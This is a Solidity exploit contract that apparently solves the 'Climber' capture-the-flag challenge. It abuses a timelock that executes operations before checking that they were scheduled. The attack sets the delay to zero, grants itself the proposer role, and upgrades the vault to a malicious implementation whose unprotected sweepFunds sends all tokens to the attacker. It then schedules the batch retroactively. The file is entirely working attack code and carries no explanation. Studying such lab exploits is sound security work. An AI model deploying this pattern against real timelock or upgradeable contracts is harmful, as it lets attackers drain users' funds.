// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

contract VaultUpgradedAttack is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    
    // Allows trusted sweeper account to retrieve any tokens -> Override
    function sweepFunds(address tokenAddress, address receiver) external {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(receiver, token.balanceOf(address(this))), "Transfer failed");
    }

    // REQUIRED! By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
}

contract ClimberVaultAttack {

    ClimberVault public climberVault;
    ClimberTimelock public climberTimeLock;
    VaultUpgradedAttack public vaultUpgradedAttack;
    IERC20 public token;

    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;
    bytes32 public salt = bytes32(0);

    constructor(
        ClimberVault _climberVault,
        ClimberTimelock _climberTimeLock, 
        IERC20 _token
    ){
        climberVault = _climberVault;
        climberTimeLock = _climberTimeLock;

        token = _token;
    }

    function attack() external {

        prepareAttackOperations();
        climberTimeLock.execute(targets, values, dataElements, salt);

    }

    function prepareAttackOperations() internal {
        vaultUpgradedAttack = new VaultUpgradedAttack();

        //change delay to 0
        addDataToArray(
            address(climberTimeLock), 
            abi.encodeWithSignature("updateDelay(uint64)", 0)
        );
    
        //grant proposer role to address this
        addDataToArray(
            address(climberTimeLock), 
            abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this))
            );

        //Change implementation contract of vault to VaultUpgradedAttack
        addDataToArray(
            address(climberVault), 
            abi.encodeWithSignature("upgradeToAndCall(address,bytes)",
                address(vaultUpgradedAttack),
                abi.encodeWithSignature("sweepFunds(address,address)", address(token), tx.origin))
        );

        //Call schedule to update readyAtTimestamp time with new delay
        addDataToArray(
            address(this), 
            abi.encodeWithSignature("schedule()")
        );
    }

    function addDataToArray(address target, bytes memory data) internal {
        targets.push(target);
        dataElements.push(data);
        values.push(0);
    }

    function schedule() external {
        climberTimeLock.schedule(targets, values, dataElements, bytes32(0));
    }

}